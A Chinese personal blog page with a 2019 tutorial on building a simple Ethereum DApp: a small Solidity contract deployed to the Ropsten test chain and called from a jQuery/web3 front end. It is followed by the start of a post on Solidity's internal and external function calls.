<!DOCTYPE html>
<html lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <link rel="stylesheet" href="/style/style.css">
<script>
  var nlviconfig = {
    title: "dyf",
    author: "dyf",
    baseUrl: "/",
    theme: {
      scheme: "banderole",
      lightbox: true,
      animate: true,
      search: true,
      friends: false,
      reward: false,
      lazy: false
    }
  }
</script>




    <link rel="stylesheet" href="/script/lib/lightbox/css/lightbox.min.css">




    <link rel="stylesheet" href="/syuanpi/syuanpi.min.css">











<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="browsermode" content="application">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="dyf">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="msapplication-navbutton-color" content="#666666">
<meta name="format-detection" content="telephone=no">
<meta name="keywords" content="nlvi, Nlvi">





  <title>
  dyf
  
</title>
</head>
<body>
  <div class="progress">
  <div class="progress-inner"></div>
</div>

  
    <div class="tagcloud-mask"></div>  
<div class="tagcloud" id="tagcloud">
  <div class="tagcloud-inner">
    <a href="/tags/solo/" style="font-size: 14px;">solo</a> <a href="/tags/thinking/" style="font-size: 14px;">thinking</a> <a href="/tags/tutorial/" style="font-size: 14px;">tutorial</a>
  </div>
</div>
  

  <div class="container" style="display:none;">

    <header class="header" id="header">
  <div class="header-wrapper">
    <div class="logo">
  <div class="logo-inner syuanpi tvIn">
    <span><a href="/">dyf</a></span>
    
  </div>
</div>
    <nav class="main-nav">
  
  <ul class="main-nav-list syuanpi tvIn">
  
    <li class="menu-item">
      <a href="javascript:;" id="search">
        <span>Search</span>
        
          <span class="menu-item-label">search</span>
        
      </a>
    </li>
  
  
    
      
    
    <li class="menu-item">
      <a href="/" id="article">
        <span class="base-name">Articles</span>
        
          <span class="menu-item-label">article</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="/archives" id="archives">
        <span class="base-name">Archives</span>
        
          <span class="menu-item-label">archives</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="javascript:;" id="tags">
        <span class="base-name">Tags</span>
        
          <span class="menu-item-label">tags</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="/about" id="about">
        <span class="base-name">About</span>
        
          <span class="menu-item-label">about</span>
        
      </a>
    </li>
  
  </ul>
  
</nav>

    
    
  </div>
</header>
<div class="mobile-header">
  <div class="mobile-header-body">
    <div class="mobile-header-list">
      
        
            <div class="mobile-nav-item">
                <a href="/">
                    <span>Articles</span>
                    
                    
                </a>
            </div>
        
      
        
            <div class="mobile-nav-item">
                <a href="/archives">
                    <span>Archives</span>
                    
                    
                </a>
            </div>
        
      
        
          <div class="mobile-nav-item inner-cloud">
            <div class="mobile-nav-tag">
              <a href="javascript:;" id="mobile-tags">
                <span>Tags</span>
                
                
              </a>
            </div>
            <div class="mobile-nav-tagcloud">
              <div class="mobile-tagcloud-inner">
                <a href="/tags/solo/" style="font-size: 14px;">solo</a> <a href="/tags/thinking/" style="font-size: 14px;">thinking</a> <a href="/tags/tutorial/" style="font-size: 14px;">tutorial</a>
              </div>
            </div>
          </div>
        
      
        
            <div class="mobile-nav-item">
                <a href="/about">
                    <span>About</span>
                    
                    
                </a>
            </div>
        
      
    </div>
  </div>
  <div class="mobile-header-nav">
    <div class="mobile-header-item" id="mobile-left">
      <div class="header-menu-item">
        <span class="header-menu-line"></span>
      </div>
    </div>
    <h1 class="mobile-header-title">
      <a href="/">dyf</a>
    </h1>
    <div class="mobile-header-item"></div>
  </div>
</div>
    <div class="container-inner">

    <h1 style="
    text-align:center;
    font-family:cathsgbr;
    color: #FC5185;
    font-weight:500;
    font-size:30px;
    ">The dyf's blog</h1>

      <main class="main" id="main">
        <div class="main-wrapper">
          
  

<section class="posts">
  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-03-19</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/03/19/DAPP开发记录/">DAPP开发记录</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="DAPP的简单原理"><a href="#DAPP的简单原理" class="headerlink" title="DAPP的简单原理"></a>DAPP的简单原理</h3><hr>
<p>&emsp;&emsp;DAPP实在是神奇，理解他的工作原理还是需要熟悉区块链的运作方式，在此记录一下我的心路历程。  </p>
<h4 id="后端在哪"><a href="#后端在哪" class="headerlink" title="后端在哪"></a>后端在哪</h4><p>&emsp;&emsp;每次一想到应用开发就觉得需要前后端的配合，后端总得在一台机器上吧，要不然我咋访问，咋交互？但是DAPP就不是这样，我们似乎只能访问其中的节点，以以太坊为例，每一个参与活动的客户端同时又是一个节点，我们自然可以在本地建立轻节点或者全节点，甚至是测试链，由于贫穷，我们在开发调试时就在测试链上进行。  </p>
<p>&emsp;&emsp;那么所谓的后端实际上是整个区块链，当合约被部署到区块链上时，整个区块链将成为他的数据库，我们将数据称之为负载，将代码称之为合约。合约之所以称之为合约是因为其不可篡改性以及调用时需要付出代价，即<strong>gas</strong>。gas可由eth(以太币)进行兑换，gas将用于奖励确认交易的矿工。这里需要注意，所谓交易的确认不过是新的区块的生成，可能有多个交易被打包在一个区块内，由于去中心化所导致的节点间完全不信任，但是新的区块总需要有个人进行确认，这时，就需要引入一种限制方式，或者说证明自己不是 <strong>骗子</strong> 的条件，即<strong>工作量证明</strong>(Proof of Work)。你如果要添加一个新的区块，你就要付出工作量的代价，因此就会有挖矿这么一说。  </p>
<p>&emsp;&emsp;当然，以上只是简单解释，其中的数学问题相当复杂，比如拜占庭将军问题的处理，等等。而且证明方式也不只是 Proof of work 这么一种。  </p>
<h4 id="合约在哪"><a href="#合约在哪" class="headerlink" title="合约在哪"></a>合约在哪</h4><p>&emsp;&emsp;当你理解了上面的原理之后，这个问题其实很简单，合约自然是在整个区块链上。在remix中进行deploy时，此合约就已经被添加到了区块中，我们在等待区块被确认后，我们通过 <strong>ABI</strong>(Application Binary Interface),即应用二进制接口和<strong>合约的地址</strong>来进行调用。没错，合约本身就是一个地址，也是一个账户，当调用它是要给它冲钱。这个时候我们将数据参数发送至某个节点，在EVM运行合约并处理数据后，可能会将数据添加到链上做数据负载，或者将一些负载返回给客户端。我们也可以调用合约的接口来访问visable的状态变量，以面向对象的思想进行思考总是会得到新的体验，这就是设计模式的魅力所在。</p>
<h4 id="开始构建"><a href="#开始构建" class="headerlink" title="开始构建"></a>开始构建</h4><p>&emsp;&emsp;在做了一部分背景介绍后，我们来进行开发，所需工具如下：  </p>
<ul>
<li><p><strong>remix-ide</strong>  </p>
</li>
<li><p><strong>MetaMask</strong>  </p>
</li>
<li><p><strong>geth</strong>  </p>
</li>
<li><p><strong>lite-server</strong>  </p>
</li>
</ul>
<ol>
<li>合约的部署  </li>
</ol>
<p>&emsp;&emsp;首先我们使用remix-ide，我个人建议本地安装，去github上下载。接下来我们将合约进行编译，目前的通用版本是0.5.5,这里<strong>Environment</strong>应该选择<strong>Injected Web3</strong>。开发的环境选择Ropsten测试链，因为在这条链上我们可以免费获得eth，实在是穷人啊！至于如何获得免费的以太币我们最后再讲。总的设置如下：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/dapp_1.png?raw=true" alt="remix-ide">  </p>
<p>&emsp;&emsp;合约会自动编译，接下来我们将合约部署到区块链上，点击下面的deploy：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/dapp_3.png?raw=true" alt="deploy">  </p>
<p>&emsp;&emsp;会出现MetaMask的弹框，让你确认是否进行交易，我们可以看到虽然没有向合约支付，但是却要为矿工支付gas。接下来我们等待一段时间后可以看到交易被确认：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/dapp_2.png?raw=true" alt="commit">  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract human&#123;</span><br><span class="line">    uint age;</span><br><span class="line">    string name = &quot;dyf&quot;;</span><br><span class="line"></span><br><span class="line">    function setInfo(uint256 _age, string memory _name) public &#123;</span><br><span class="line">        age =_age;</span><br><span class="line">        name = _name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getInfo() public view returns(uint256,string memory )&#123;</span><br><span class="line">        return (age,name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; <strong>请注意这里函数的view</strong></p>
<p>&emsp;&emsp;以上是我的交易记录，到这里我们的合约已经部署完毕。下一步是在前端引用合约。</p>
<hr>
<ol start="2">
<li>合约的调用  </li>
</ol>
<p>&emsp;&emsp;在html中，要实现与区块链的交互我们还是需要Web3的api，就像geth一样，只是被迁移到了前端，这里给出api库：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;有时间还得读读他的文档，为了方便起见我们最好使用jQuery库，我觉得挺舒服的，直接给出前端代码：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.3.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">            <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">utf-8</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>my dapp<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">'info'</span>&gt;</span>info<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>age:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"age"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"button"</span>&gt;</span>Go<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"get"</span>&gt;</span> Get info<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"web3"</span>+web3);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(<span class="keyword">typeof</span> web3 != <span class="string">'undifined'</span>)&#123;</span></span><br><span class="line"><span class="javascript">        web3 = <span class="keyword">new</span> Web3(web3.currentProvider);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">        web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvide(<span class="string">"http://localhost:8545"</span>));</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> infoContract = web3.eth.contract(</span></span><br><span class="line"><span class="undefined">       [</span></span><br><span class="line"><span class="undefined">	    &#123;</span></span><br><span class="line"><span class="javascript">        <span class="string">"constant"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">"inputs"</span>: [],</span></span><br><span class="line"><span class="javascript">        <span class="string">"name"</span>: <span class="string">"getInfo"</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">"outputs"</span>: [</span></span><br><span class="line"><span class="undefined">          &#123;</span></span><br><span class="line"><span class="javascript">            <span class="string">"name"</span>: <span class="string">""</span>,</span></span><br><span class="line"><span class="javascript">            <span class="string">"type"</span>: <span class="string">"uint256"</span></span></span><br><span class="line"><span class="undefined">          &#125;,</span></span><br><span class="line"><span class="undefined">          &#123;</span></span><br><span class="line"><span class="javascript">            <span class="string">"name"</span>: <span class="string">""</span>,</span></span><br><span class="line"><span class="javascript">            <span class="string">"type"</span>: <span class="string">"string"</span></span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        ],</span></span><br><span class="line"><span class="javascript">        <span class="string">"payable"</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">"stateMutability"</span>: <span class="string">"view"</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">"type"</span>: <span class="string">"function"</span></span></span><br><span class="line"><span class="undefined">      &#125;,</span></span><br><span class="line"><span class="undefined">      &#123;</span></span><br><span class="line"><span class="javascript">        <span class="string">"constant"</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">"inputs"</span>: [</span></span><br><span class="line"><span class="undefined">          &#123;</span></span><br><span class="line"><span class="javascript">            <span class="string">"name"</span>: <span class="string">"_age"</span>,</span></span><br><span class="line"><span class="javascript">            <span class="string">"type"</span>: <span class="string">"uint256"</span></span></span><br><span class="line"><span class="undefined">          &#125;,</span></span><br><span class="line"><span class="undefined">          &#123;</span></span><br><span class="line"><span class="javascript">            <span class="string">"name"</span>: <span class="string">"_name"</span>,</span></span><br><span class="line"><span class="javascript">            <span class="string">"type"</span>: <span class="string">"string"</span></span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        ],</span></span><br><span class="line"><span class="javascript">        <span class="string">"name"</span>: <span class="string">"setInfo"</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">"outputs"</span>: [],</span></span><br><span class="line"><span class="javascript">        <span class="string">"payable"</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">"type"</span>: <span class="string">"function"</span></span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">]</span></span><br><span class="line"><span class="undefined">  )</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> info = infoContract.at(<span class="string">'0x3d2f4d5eb88848e75c966118c98f4928aa188f21'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  $(<span class="string">"#button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> name = $(<span class="string">"#name"</span>).val();</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> age = $(<span class="string">"#age"</span>).val()</span></span><br><span class="line"><span class="javascript">      info.setInfo(age,name,<span class="function"><span class="keyword">function</span>(<span class="params">error,result</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span>(!error)&#123;</span></span><br><span class="line"><span class="javascript">              <span class="built_in">console</span>.log(<span class="string">"ok"</span>);</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">  &#125;)</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#get'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        info.getInfo(<span class="function"><span class="keyword">function</span>(<span class="params">error,result</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">          $(<span class="string">'#info'</span>).html(<span class="string">"name:"</span>+result[<span class="number">1</span>]+<span class="string">"&amp;emsp;age:"</span>+result[<span class="number">0</span>]);</span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;首先验证引入web3成功<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"web3"</span>+web3);</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;接着我们链接web3的provider或本的链，在这里就是lite-server所创建的服务器环境，lite-server的作用是建立服务器连接，因为MetaMask存在保护，这样才能引入Web3，反正windows用户应该挺难受的。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> web3 != <span class="string">'undifined'</span>)&#123;</span><br><span class="line">       web3 = <span class="keyword">new</span> Web3(web3.currentProvider);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">       web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvide(<span class="string">"http://localhost:8545"</span>));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;然后我们生成一个合约对象，这里我们需要编译合约时生成的ABI和地址：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/** 注入合约ABI **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> infoContract = web3.eth.contract(</span><br><span class="line">       [</span><br><span class="line">	    &#123;</span><br><span class="line">        <span class="string">"constant"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"inputs"</span>: [],</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"getInfo"</span>,</span><br><span class="line">        <span class="string">"outputs"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"string"</span></span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"payable"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"stateMutability"</span>: <span class="string">"view"</span>,</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"function"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"constant"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"inputs"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"_age"</span>,</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"_name"</span>,</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"string"</span></span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"setInfo"</span>,</span><br><span class="line">        <span class="string">"outputs"</span>: [],</span><br><span class="line">        <span class="string">"payable"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"function"</span></span><br><span class="line">      &#125;</span><br><span class="line">]</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 注入合约地址 **/</span></span><br><span class="line">  <span class="keyword">var</span> info = infoContract.at(<span class="string">'0x3d2f4d5eb88848e75c966118c98f4928aa188f21'</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这是我们就得到了一个合约实例，我们可以按照通常面向对象的方式来调用他们的接口。比如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> name = $(<span class="string">"#name"</span>).val();</span><br><span class="line">      <span class="keyword">var</span> age = $(<span class="string">"#age"</span>).val()</span><br><span class="line">      info.setInfo(age,name,<span class="function"><span class="keyword">function</span>(<span class="params">error,result</span>)</span>&#123;</span><br><span class="line">          <span class="keyword">if</span>(!error)&#123;</span><br><span class="line">              <span class="built_in">console</span>.log(<span class="string">"ok"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">    $(<span class="string">'#get'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        info.getInfo(<span class="function"><span class="keyword">function</span>(<span class="params">error,result</span>)</span>&#123;</span><br><span class="line">          $(<span class="string">'#info'</span>).html(<span class="string">"name:"</span>+result[<span class="number">1</span>]+<span class="string">"&amp;emsp;age:"</span>+result[<span class="number">0</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里是基于jQuery的信息交互，我们可以清晰的理解这种调用方式，我们向节点服务器发送交易请求，当交易被确认后，前端的数据可以通过调用接口的方式进行刷新，但是数据的更新会有延迟，毕竟交易的确认需要时间。  </p>
<p>&emsp;&emsp;到这里，一个极端简单的DAPP已经开发完成，但是区块链神奇的思想可见一斑，由此看来我们还是要好好学设计模式和数学才能更加深刻的理解这个神奇的生态环境。</p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-03-18</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/03/18/solidity中令人窒息的语法糖/">solidity中令人窒息的语法糖</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="Solidity函数的困惑"><a href="#Solidity函数的困惑" class="headerlink" title="Solidity函数的困惑"></a>Solidity函数的困惑</h3><hr>
<p>&emsp;&emsp;关于Solidity我看的是不明不白，主要是web3的api几乎一无所知，而且对区块链的理解也不够深刻，在此记录一下一些令我窒息的语法糖。  </p>
<h4 id="1-关于函数的可见型与访问控制"><a href="#1-关于函数的可见型与访问控制" class="headerlink" title="1. 关于函数的可见型与访问控制"></a>1. 关于函数的可见型与访问控制</h4><p>&emsp;&emsp;Solidity封装了两种函数调用方式 <strong><code>internal</code></strong> 与 <strong><code>external</code></strong>   </p>
<ul>
<li><strong>internal</strong> </li>
</ul>
<p>&emsp;&emsp;internal调用，实现时转为简单的EVM跳转，所以他能够直接访问上下文的数据，对于引用传递是十分高效，例如memory之间的值传递，实际上是引用的传递(妈耶，storage和memory又是坑，不同版本真是令人窒息)。  </p>
<p>&emsp;&emsp;当前代码单元内，比如同一个合约内的函数，引入的library库，以及父类函数的直接调用即为internal调用，比如：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function a() internal &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function b() internal &#123;</span><br><span class="line">        a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在上述代码中的b()对a()的调用即为internal方式调用，函数在不显式声明访问类型时,以目前的版本来看会报错。</p>
<ul>
<li><strong>external</strong>  </li>
</ul>
<p>&emsp;&emsp;external调用实现了合约的外部消息调用。所以合约在初始化时不能以external的方式调用自身函数，因为此时合约仍未构造完成，此处可类比struct类型，一个结构体不能包含自身对象。但是可以以this的方式强制进行external调用。  </p>
